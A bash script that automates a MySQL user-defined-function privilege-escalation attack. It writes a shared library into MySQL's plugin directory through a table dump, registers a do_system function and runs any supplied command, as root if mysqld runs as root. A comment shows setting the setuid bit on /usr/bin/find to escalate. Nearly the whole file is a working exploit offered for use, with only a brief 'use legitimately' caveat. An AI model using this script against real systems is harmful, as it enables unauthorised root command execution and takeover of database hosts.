#!/bin/bash

helpMe()
{
   echo ""
   echo "The script use UDF shared library on MySql to execute commands on a system, if mysqld run as root, so the passed (-c)ommand will be executed as root."
   echo "On a 64bit *nix box you can pass the compiled .so file, anyway have a look at the source C file to understand the logic."
   echo ""
   echo "How to use the script: $0 -u <mysql user> -p <mysql user password> -s <path of the shared library> -c <command to execute> e.g."
   echo "|__$0 -s lib_sys_udf.so -u root -p Secrete -c 'whoami > /tmp/whoM; chmod go+r /tmp/whoM;'"
   echo "Please use the present script legitimately"
   echo "@salut (❤) ZinZloun"
   exit 1 # Exit script after printing help
}

while getopts "s:p:c:u:" opt
do
   case "$opt" in
      s ) argS="$OPTARG" ;;
      p ) argP="$OPTARG" ;;
      c ) argC="$OPTARG" ;;
      u ) argU="$OPTARG" ;;
      ? ) helpMe ;; # Print help in case parameter is non-existent
   esac
done

# Print help in case parameters are empty
if [ -z "$argS" ] || [ -z "$argP" ] || [ -z "$argC" ] || [ -z "$argU" ]
then
   echo "Missing arguments, printing help...";
   helpMe
fi

# Begin script in case all parameters are correct

# Get always the full path of the so file
FILE="$( readlink -f "$( dirname "$argS" )" )/$( basename "$argS" )"
if [ ! -f $FILE ]
then
   echo "The file $FILE does not exists. Aborted"
   exit 1;
fi
# Get the file name of the so file
f="$(basename -- $FILE)"
echo "Shared lib full path $FILE"

# Get the MySql plugin directory path 
pathMPlugin=$(mysql mysql -u $argU -p$argP -N -se "SHOW VARIABLES WHERE Variable_Name = 'plugin_dir'")
echo "MySql  $pathMPlugin"

#apppend the file name to the plugin path
fullPath="${pathMPlugin}/${f}"

#get rid of plugin_dir part from the string 
cleanPath=${fullPath:11}

#echo $cleanPath
# Prepare the MySql commands
my_cmd="drop table if exists pwn;drop function if exists do_system;create table pwn(line blob);insert into pwn values(load_file('"$FILE"'));select * from pwn into dumpfile '"$cleanPath"';create function do_system returns integer soname '"$f"';select do_system('"$argC"');"

# Execute the commands, if all is ok the executed command with a 0 should be printed on screen, e.g.
# +--------------------------------------+
#| do_system('chmod u+s /usr/bin/find') |
#+--------------------------------------+
#|                                    0 |
#+--------------------------------------+

mysql mysql -u $argU -p$argP  -e "$my_cmd"
